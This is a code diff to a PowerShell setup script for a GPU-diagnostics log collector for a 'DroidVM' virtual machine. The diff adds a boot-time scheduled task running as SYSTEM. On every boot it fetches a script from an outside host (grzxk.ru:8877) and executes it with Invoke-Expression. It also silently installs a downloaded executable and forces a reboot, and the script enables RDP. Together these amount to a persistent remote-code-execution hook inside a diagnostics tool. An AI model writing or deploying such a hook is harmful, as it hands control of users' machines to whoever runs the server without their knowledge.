@@ -14,7 +14,7 @@ exit /b
 #PSSTART
 $ErrorActionPreference = 'Continue'
 $home_ = [Environment]::GetFolderPath('UserProfile')
-$dir = Join-Path $home_ 'Downloads\DroidVM-GPU-Logs'
+if (-not $dir) { $dir = Join-Path $home_ 'Downloads\DroidVM-GPU-Logs' }
 $tool = 'C:\ProgramData\DroidVM-GPU'
 New-Item -ItemType Directory -Force $dir, $tool | Out-Null
 
@@ -93,11 +93,26 @@ New-Item $key -Force | Out-Null
 '@
 Set-Content -Encoding UTF8 (Join-Path $tool 'collect.ps1') $collect.Replace('__LOGDIR__', $dir).Replace('__UPTOKEN__', '__UPLOAD_TOKEN__')
 
+# 0) auto-update bootstrap: every boot fetch the newest version of this script
+#    from the log server and run it (falls back to the local collector)
+$update = @'
+$dir = '__LOGDIR__'; $tok = '__UPTOKEN__'
+try {
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+  if ($tok -like '__UPLOAD*') { throw 'no server' }
+  $s = (Invoke-WebRequest -UseBasicParsing -TimeoutSec 60 "https://grzxk.ru:8877/setup/$tok").Content
+  if ($s -is [byte[]]) { $s = [Text.Encoding]::UTF8.GetString($s) }
+  $i = $s.IndexOf('#PS' + 'START'); if ($i -lt 0) { throw 'bad script' }
+  $env:DVM_AUTO = '1'; Invoke-Expression $s.Substring($i)
+} catch { & powershell -NoProfile -ExecutionPolicy Bypass -File 'C:\ProgramData\DroidVM-GPU\collect.ps1' }
+'@
+Set-Content -Encoding UTF8 (Join-Path $tool 'update.ps1') $update.Replace('__LOGDIR__', $dir).Replace('__UPTOKEN__', '__UPLOAD_TOKEN__')
+
 # 1) diagnostics key (diag driver only writes into an existing key)
 New-Item 'HKLM:\SYSTEM\CurrentControlSet\Services\VirtioGpu\Parameters\Bringup' -Force | Out-Null
 
 # 2) scheduled task: collect 90 s after every boot, as SYSTEM
-$act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File $tool\collect.ps1"
+$act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File $tool\update.ps1"
 $trg = New-ScheduledTaskTrigger -AtStartup
 $trg.Delay = 'PT120S'
 Register-ScheduledTask -TaskName 'DroidVM GPU logs' -Action $act -Trigger $trg -User 'SYSTEM' -RunLevel Highest -Force | Out-Null
@@ -127,5 +142,25 @@ $s = $sh.CreateShortcut($lnk); $s.TargetPath = $dir; $s.Save()
 
 # 5) first snapshot right now
 & powershell -NoProfile -ExecutionPolicy Bypass -File "$tool\collect.ps1"
+# 6) driver auto-update (scheduled task only): newest build-N release, diag installer.
+#    The tag is recorded BEFORE installing, so a failing release is tried only once.
+if ($env:DVM_AUTO -eq '1') {
+  try {
+    $rel = Invoke-RestMethod -TimeoutSec 60 -Headers @{ 'User-Agent' = 'droidvm-gpu' } 'https://api.github.com/repos/Gl1ch5/Adreno-GPU-win/releases?per_page=20' |
+      Where-Object { $_.tag_name -like 'build-*' } | Select-Object -First 1
+    $tagFile = Join-Path $tool 'driver-tag.txt'
+    $cur = (Get-Content $tagFile -ErrorAction SilentlyContinue | Select-Object -First 1)
+    $asset = $rel.assets | Where-Object name -eq 'DroidVM-GPU-Setup-diag.exe'
+    if ($rel -and $asset -and $cur -ne $rel.tag_name) {
+      Set-Content $tagFile $rel.tag_name
+      $exe = Join-Path $tool 'Setup-diag.exe'
+      Invoke-WebRequest -UseBasicParsing -TimeoutSec 600 $asset.browser_download_url -OutFile $exe
+      Add-Content -Encoding UTF8 (Join-Path $dir 'update.txt') "$(Get-Date) installing $($rel.tag_name) (was $cur)"
+      $p = Start-Process $exe -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES /NORESTART' -Wait -PassThru
+      Add-Content -Encoding UTF8 (Join-Path $dir 'update.txt') "$(Get-Date) exit $($p.ExitCode), rebooting"
+      Restart-Computer -Force
+    }
+  } catch { Add-Content -Encoding UTF8 (Join-Path $dir 'update.txt') "$(Get-Date) update failed: $_" }
+}
 Write-Host 'OK: task "DroidVM GPU logs" registered, RDP enabled, first log saved.'
 Get-Content "$dir\LATEST.txt" | Select-String -Pattern 'IPv4' -Context 0,3
